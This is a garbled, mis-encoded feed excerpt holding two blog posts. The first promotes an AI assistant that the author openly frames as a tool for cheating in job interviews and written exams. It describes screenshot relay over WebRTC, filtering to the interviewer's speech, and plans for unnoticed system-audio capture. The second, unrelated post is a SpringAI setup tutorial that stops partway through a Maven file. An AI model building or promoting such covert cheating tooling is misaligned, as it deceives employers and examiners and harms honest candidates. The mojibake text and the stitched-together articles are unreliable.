<p>é¡¹ç›®åœ°å€:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.offercar.cn%2F" target="_blank" title="https://www.offercar.cn/" ref="nofollow noopener noreferrer">OfferCar AI - AI é¢è¯•ç¬”è¯•åŠ©æ‰‹ | æ™ºèƒ½é¢è¯•æ¨¡æ‹Ÿå¹³å°</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80f3241172974993b612b350ae10131c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM5pq06b6Z5oiY5aOr6YCa5YWz5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767972678&amp;x-signature=rgMMyztaeioZEVFm5mR%2B9OlePn4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒã€æ¶æ„ç¾å­¦ï¼šä¸åšé€šç”¨ï¼Œåšåœºæ™¯</h2>
<p>å¸‚é¢ä¸Šçš„ AI èŠå¤© Demo æ»¡å¤©é£ï¼Œå¤§å¤šæ˜¯ <code>useChat</code> ä¸€æŠŠæ¢­ã€‚ä½†åœ¨â€œé¢è¯•ä½œå¼Šâ€è¿™ä¸ªé«˜å‹åœºæ™¯ä¸‹ï¼Œé€šç”¨å‹æ¶æ„æ ¹æœ¬æ‰›ä¸ä½ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦çš„æ˜¯<strong>æè‡´çš„è§£è€¦</strong>ã€‚</p>
<h3 data-id="heading-2">1. UI ä¸é€»è¾‘çš„ç‰©ç†éš”ç¦»</h3>
<p><strong>UI ç»„ä»¶ä¸æŒæœ‰ä¸šåŠ¡çŠ¶æ€</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a81417d75f3b4bc98c7b2e2a224035f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM5pq06b6Z5oiY5aOr6YCa5YWz5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767972678&amp;x-signature=KyaGB7so9sPOvDY3dtD6p4ZZBPs%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸ºæ­¤æŠ½è±¡äº† <code>SessionMainContent</code> â€”â€” å®ƒæ˜¯æ•´ä¸ªç³»ç»Ÿçš„â€œæ˜¾ç¤ºå™¨â€ã€‚å®ƒåªè´Ÿè´£ä¸€ä»¶äº‹ï¼š<strong>æ¸²æŸ“</strong>ã€‚</p>
<ul>
<li>å®ƒä¸å…³å¿ƒæ˜¯â€œé¢è¯•â€è¿˜æ˜¯â€œç¬”è¯•â€ã€‚</li>
<li>å®ƒä¸å…³å¿ƒæ¶ˆæ¯æ˜¯ Socket æ¨é€çš„è¿˜æ˜¯ HTTP æ‹‰å–çš„ã€‚</li>
<li>å®ƒåªæ¥æ”¶ <code>messages</code> æ•°ç»„å’Œå›è°ƒå‡½æ•°ã€‚</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¯ç²¹çš„ UI å®šä¹‰ï¼Œæ²¡æœ‰æ‚ä¹±çš„ useEffect</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">SessionMainContentProps</span> {
  <span class="hljs-attr">messages</span>: <span class="hljs-title class_">ChatMessage</span>[];        <span class="hljs-comment">// æ•°æ®æº</span>
  <span class="hljs-attr">streamingContent</span>: <span class="hljs-built_in">string</span>;       <span class="hljs-comment">// æµå¼ç¼“å†²åŒº</span>
  <span class="hljs-attr">isStreaming</span>: <span class="hljs-built_in">boolean</span>;           <span class="hljs-comment">// çŠ¶æ€ä½</span>
  <span class="hljs-attr">sendPendingMessagesToAI</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>; <span class="hljs-comment">// åŠ¨ä½œæŒ‡ä»¤</span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-3">2. ä¸šåŠ¡å®¹å™¨ï¼šController çš„è¯ç”Ÿ</h3>
<p><code>ExamSession</code> å’Œ <code>InterviewSession</code>ã€‚è¿™ä¸¤ä¸ªç»„ä»¶æ˜¯çœŸæ­£çš„<strong>ä¸šåŠ¡å®¹å™¨</strong>ã€‚</p>
<ul>
<li><strong>InterviewSession</strong>ï¼šåˆå§‹åŒ– <code>useInterviewSession</code>ï¼Œå»ºç«‹è¯­éŸ³è¯†åˆ«é€šé“ï¼ŒæŒ‚è½½ <code>DeviceStatusPanel</code>ï¼ˆéŸ³é‡ç›‘æ§ï¼‰ã€‚</li>
<li><strong>ExamSession</strong>ï¼šåˆå§‹åŒ– <code>useExamSession</code>ï¼Œç›‘å¬å…¨å±€æˆªå›¾æŒ‡ä»¤ï¼ŒæŒ‚è½½ç®€åŒ–ç‰ˆçŠ¶æ€æ ã€‚</li>
</ul>
<p>è¿™ç§è®¾è®¡è®© MVP é˜¶æ®µçš„ä»£ç ææ˜“ç»´æŠ¤ï¼šæ”¹ UI ä¸åŠ¨é€»è¾‘ï¼Œæ”¹é€»è¾‘ä¸å´© UIã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒå¤§è„‘ï¼š<code>useChatSession</code> çš„ç‚¼æˆ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5016cafdf8e4a39b5a76f25d943ed24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM5pq06b6Z5oiY5aOr6YCa5YWz5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767972678&amp;x-signature=C8LN%2BiMI%2FdcWCs1HfhYAeIIJ%2Fvg%3D" alt="image.png" loading="lazy"/>
è¿™æ˜¯æ•´ä¸ªå‰ç«¯æœ€â€œé‡â€çš„ Hookï¼Œä¹Ÿæ˜¯ä¸ LLM ææ–—çš„ä¿®ç½—åœºã€‚åœ¨ MVP é˜¶æ®µï¼Œæˆ‘ç æ‰äº†æ‰€æœ‰èŠ±å“¨åŠŸèƒ½ï¼Œåªä¿ç•™<strong>ä»˜è´¹é—­ç¯</strong>æ‰€éœ€çš„é€»è¾‘ã€‚</p>
<h3 data-id="heading-5">1. æ€è€ƒé“¾ï¼ˆCoTï¼‰çš„ 60fps æ¸²æŸ“</h3>
<p>ç°åœ¨çš„ DeepSeek ç­‰æ¨ç†æ¨¡å‹ä¼šè¾“å‡º <code>&lt;think&gt;</code> æ ‡ç­¾ã€‚å¦‚æœç›´æ¥æ¸²æŸ“ï¼Œç”¨æˆ·ä¼šçœ‹åˆ°ä¸€å †ä¹±ç ï¼›å¦‚æœç­‰æ€è€ƒå®Œå†æ˜¾ç¤ºï¼Œç”¨æˆ·ä¼šä»¥ä¸ºç½‘æ–­äº†ã€‚</p>
<p>æˆ‘çš„è§£æ³•ï¼š<strong>æµå¼è§£æ + æ¸²æŸ“èŠ‚æµ</strong>ã€‚</p>
<p>æˆ‘ä»¬å®ç°äº†ä¸€ä¸ª <code>thinkTagProcessor</code>ï¼Œå®æ—¶å°† <code>&lt;think&gt;</code> è½¬æ¢ä¸º Markdown çš„å¼•ç”¨å— <code>&gt; </code>ã€‚åŒæ—¶ï¼Œä¸ºäº†é˜²æ­¢é«˜é¢‘ <code>setState</code> å¯¼è‡´ React æ‰å¸§ï¼ˆå°¤å…¶åœ¨ä½ç«¯ç¬”è®°æœ¬ä¸Šï¼‰ï¼Œæˆ‘åŠ å…¥äº† <code>requestAnimationFrame</code> èŠ‚æµã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// èŠ‚æµé˜€ï¼šè®© AI çš„æ€è€ƒè¿‡ç¨‹å¦‚ä¸èˆ¬é¡ºæ»‘ï¼Œè€Œä¸æ˜¯å¡é¡¿çš„æ‰“å°æœº</span>
<span class="hljs-keyword">const</span> tickThinkThrottle = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!isThinkRafRunningRef.<span class="hljs-property">current</span>) <span class="hljs-keyword">return</span>;
  <span class="hljs-title function_">setStreamingContent</span>(remainTextRef.<span class="hljs-property">current</span>); <span class="hljs-comment">// åªæœ‰è¿™é‡Œæ‰ä¼šè§¦å‘é‡ç»˜</span>
  thinkRafIdRef.<span class="hljs-property">current</span> = <span class="hljs-title function_">requestAnimationFrame</span>(tickThinkThrottle);
}, []);
</code></pre>
<h3 data-id="heading-6">2. æ¶ˆæ¯å›´æ ï¼šåªå¬é¢è¯•å®˜çš„è¯</h3>
<p>é¢è¯•åœºæ™¯æœ‰ä¸€ä¸ªç—›ç‚¹ï¼šé¢è¯•è€…çš„åºŸè¯å¤ªå¤šã€‚å¦‚æœå…¨å‘ç»™ AIï¼Œä¸Šä¸‹æ–‡ç¬é—´çˆ†ç‚¸ã€‚</p>
<p>æˆ‘åœ¨ <code>sendPendingMessagesToAI</code> ä¸­åŠ å…¥äº†ä¸€å±‚<strong>è¿‡æ»¤å™¨</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> sendPendingMessagesToAI = <span class="hljs-title function_">useCallback</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> pendingMessages = messages.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
    <span class="hljs-comment">// å¼€å¯ scopeCharacter åï¼ŒAI è‡ªåŠ¨å±è”½é¢è¯•è€…å‘è¨€ï¼Œåªèšç„¦é¢è¯•å®˜çš„é—®é¢˜</span>
    <span class="hljs-keyword">if</span> (scopeCharacter) {
      <span class="hljs-keyword">return</span> msg.<span class="hljs-property">speaker</span> === <span class="hljs-string">'interviewer'</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  });
  <span class="hljs-comment">// ...</span>
}, [<span class="hljs-comment">/*...*/</span>]);
</code></pre>
<p>è¿™ä¸ä»…ä»…æ˜¯çœ Tokenï¼Œæ›´æ˜¯ä¸ºäº†<strong>æé«˜å›ç­”çš„ä¿¡å™ªæ¯”</strong>ã€‚</p>
<h2 data-id="heading-7">å››ã€é™ç»´æ‰“å‡»ï¼šWebRTC çš„å¦ç±»ç”¨æ³•</h2>
<p>æåˆ° WebRTCï¼Œå¤§å®¶ç¬¬ä¸€ååº”æ˜¯è§†é¢‘é€šè¯ã€‚ä½†åœ¨æˆ‘çš„æ¶æ„é‡Œï¼ŒWebRTC æ˜¯<strong>è·¨ç«¯é€šä¿¡çš„é«˜é€Ÿå…¬è·¯</strong>ã€‚</p>
<p>è¿™æ˜¯å…¸å‹çš„â€œæŠ€æœ¯é™ç»´æ‰“å‡»â€ã€‚æˆ‘ä»¬ä¸éœ€è¦è§†é¢‘æµï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯<strong>ä½å»¶è¿Ÿçš„æŒ‡ä»¤é€šé“</strong>ã€‚</p>
<h3 data-id="heading-8">1. DataChannelï¼šä¸ä¼ è§†é¢‘ä¼ æŒ‡ä»¤</h3>
<p>æˆ‘åˆ©ç”¨ WebRTC çš„ <code>DataChannel</code> å»ºç«‹äº†ä¸¤ä¸ªæ ¸å¿ƒç®¡é“ï¼š</p>
<ul>
<li><strong><code>exam-commands</code></strong>ï¼šä¼ è¾“æ§åˆ¶æŒ‡ä»¤ã€‚Electron æˆªå›¾åï¼Œé€šè¿‡æ­¤é€šé“ç›´æ¥å°† Base64 æ¨é€åˆ° Web ç«¯ï¼Œé€Ÿåº¦æ¯«ç§’çº§ã€‚</li>
<li><strong><code>recognition-text</code></strong>ï¼šä¼ è¾“å®æ—¶è¯­éŸ³è½¬å†™æ–‡æœ¬ã€‚</li>
</ul>
<p>è¿™ç§è®¾è®¡é¿å¼€äº†ä¼ ç»Ÿ HTTP è½®è¯¢çš„å»¶è¿Ÿï¼Œä¹Ÿæ¯” WebSocket æ›´è½»é‡ï¼ˆP2P ç›´è¿ï¼‰ã€‚</p>
<pre><code class="hljs language-typescript:hooks.ts" lang="typescript:hooks.ts">// ç›‘å¬æ¥è‡ª Electron çš„â€œé‡å­çº ç¼ â€ä¿¡å·
channel.onmessage = (event) =&gt; {
  const message = JSON.parse(event.data);
  if (message.type === 'screenshot') {
    // ç¬é—´ä¸Šå±ï¼Œæ— æ„ŸçŸ¥ä¼ è¾“
    addImageToPendingMessages(message.data);
  }
};
</code></pre>
<h2 data-id="heading-9">äº”ã€ä½“éªŒå¾®æ“ï¼šRedux é…ç½®ä¸­å¿ƒ</h2>
<p>UI/UX çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯**â€œæ˜¾å¾—å€¼é’±â€**ã€‚</p>
<p>ä¸ºäº†è®©ç”¨æˆ·è§‰å¾—â€œè¿™ä¸ªå¤–æŒ‚å¾ˆä¸“ä¸šâ€ï¼Œæˆ‘ç”¨ Redux Toolkit (<code>settingsSlice</code>) ç®¡ç†äº†å…¨å±€åå¥½ï¼š</p>
<ul>
<li><strong>å­—å·å¾®è°ƒ</strong>ï¼šAI å›ç­”å­—å·ã€é¢è¯•å®˜å­—å·ç‹¬ç«‹æ§åˆ¶ã€‚</li>
<li><strong>åŒè¯­å¼€å…³</strong>ï¼šä¸€é”®åˆ‡æ¢ä¸­è‹±å¯¹ç…§ï¼Œç¬é—´æå‡é€¼æ ¼ã€‚</li>
</ul>
<p>è¿™äº›é…ç½®åœ¨ <code>SessionMainContent</code> ä¸­è¢«å®æ—¶è®¢é˜…ã€‚ç”¨æˆ·æ‹–åŠ¨æ»‘å—ï¼Œç•Œé¢å³æ—¶å“åº”ã€‚è¿™ç§<strong>æŒæ§æ„Ÿ</strong>ï¼Œæ˜¯ä»˜è´¹æ„æ„¿çš„æ¥æºä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-10">å…­ã€ç»“è¯­ï¼šAI æ—¶ä»£ï¼Œæ‹¿å›ä½ çš„ç”Ÿäº§èµ„æ–™</h2>
<p>å†™åˆ°è¿™é‡Œï¼Œæˆ‘æƒ³è¯´ï¼šä»£ç åªæ˜¯å·¥å…·ï¼Œæ˜¯è¿æ¥ç°å®ä¸æ•°å­—ä¸–ç•Œçš„é“²å­ã€‚AI è®©è¿™æŠŠé“²å­å˜æˆäº†æŒ–æ˜æœºï¼Œä½†æŒ–æ˜æœºæœ¬èº«ä¸ä¼šå†³å®šå»å“ªé‡ŒæŒ–æ˜å®è—ã€‚</p>
<p>åœ¨è¿™ä¸ªé¡¹ç›®é‡Œï¼ŒAI å¸®æˆ‘ç”Ÿæˆäº†100% çš„ ä¸šåŠ¡é€»è¾‘ã€‚
åˆ«ç„¦è™‘ï¼Œå»åˆ›é€ ã€‚æ‰“å¼€ç¼–è¾‘å™¨ï¼Œå»æƒ³ä¸€ä¸ªä½ çœŸæ­£æƒ³è§£å†³çš„é—®é¢˜ã€‚
é¡¹ç›®åœ°å€:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.offercar.cn%2F" target="_blank" title="https://www.offercar.cn/" ref="nofollow noopener noreferrer">OfferCar AI - AI é¢è¯•ç¬”è¯•åŠ©æ‰‹ | æ™ºèƒ½é¢è¯•æ¨¡æ‹Ÿå¹³å°</a></p>
<p>ä¸‹ä¸€ç¯‡ï¼Œæˆ‘ä»¬å°†æ·±å…¥ Electron å®¢æˆ·ç«¯ï¼Œçœ‹çœ‹å¦‚ä½•è¿›å…¥ç³»ç»ŸéŸ³é¢‘æµï¼Œå®ç°æ— æ„Ÿé‡‡é›†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ååˆ†é’Ÿå…¥é—¨SpringAI]]></title>    <link>https://juejin.cn/post/7590654280899592235</link>    <guid>https://juejin.cn/post/7590654280899592235</guid>    <pubDate>2026-01-02T15:52:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280899592235" data-draft-id="7590020026395410486" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ååˆ†é’Ÿå…¥é—¨SpringAI"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-02T15:52:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©é“ä½©æ©"/> <meta itemprop="url" content="https://juejin.cn/user/536217406931069"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ååˆ†é’Ÿå…¥é—¨SpringAI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/536217406931069/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©é“ä½©æ©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:52:07.000Z" title="Fri Jan 02 2026 15:52:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>SpringAIï¼ŒMake Java great again</p>
<p>è¿˜å¾—æ˜¯Springå•Šï¼ŒJavaå¼€å‘ä¸€è¾ˆå­éƒ½å¾—ç†Ÿç»ƒæŒæ¡çš„æ¡†æ¶ï¼ŒSpringAIå¸®ä½ å¯¹æ¥å¤šä¸ªAIæ¨¡å‹ï¼Œå±è”½åº•å±‚å¤æ‚çš„å¤„ç†ï¼Œä½¿ç”¨æŠ½è±¡ã€ç»Ÿä¸€çš„æ¥å£ï¼Œåˆ‡æ¢æ¨¡å‹åªéœ€æ›´æ”¹é…ç½®ï¼Œæ— éœ€æ”¹ä»£ç ï¼Œååˆ†é’Ÿå…¥é—¨ Java-AIå¼€å‘ï¼Œæ¥ä¸‹æ¥å¼€å§‹ä¸Šè¯¾ï¼ä¸Šä¸€ç¯‡ä»‹ç»äº†æœ¬åœ°ä¸‹è½½Ollamaï¼Œæœ¬æœŸä¸å†èµ˜è¿°ï¼Œä½†æ˜¯éœ€è¦å¼€å¯æœ¬åœ°Ollama</p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒSpringæ¡†æ¶å¼€å‘ä¸‰éƒ¨æ›²ï¼Œå¯¼å…¥ä¾èµ–ï¼Œç¼–å†™é…ç½®ï¼Œç¼–å†™ä¸šåŠ¡ä»£ç ï¼Œ SpringAIä¹Ÿæ˜¯å¦‚æ­¤</p>
<h2 data-id="heading-1">å¯¼å…¥ä¾èµ–</h2>
<p>SpringAIæ”¯æŒçš„jdkæœ€ä½ç‰ˆæœ¬ä¸º17ï¼Œspring-bootæœ€ä½ç‰ˆæœ¬3.x</p>
<p><strong>PSï¼šä»¥ä¸‹çš„ dependencyManagement æ˜¯å¸®å¿™ç®¡ç† spring-ai ç›¸å…³ä¾èµ–çš„ï¼Œéå¸¸é‡è¦ï¼Œä¸€å®šè¦å¸¦ä¸Š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">spring-ai.version</span>&gt;</span>1.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">spring-ai.version</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-model-ollama<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
â€‹
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
